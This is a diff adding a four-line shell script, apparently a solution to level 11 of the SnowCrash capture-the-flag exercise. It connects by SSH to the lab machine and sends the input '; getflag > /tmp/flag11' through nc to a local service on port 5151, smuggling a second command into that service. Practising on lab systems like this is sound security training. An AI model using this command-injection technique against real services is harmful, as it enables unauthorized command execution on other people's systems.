@@ -1,0 +1,4 @@
+ssh level11@$SNOWCRASH_IP -p 4242 '
+	echo "; getflag > /tmp/flag11" | nc 127.0.0.1 5151
+	cat /tmp/flag11
+'
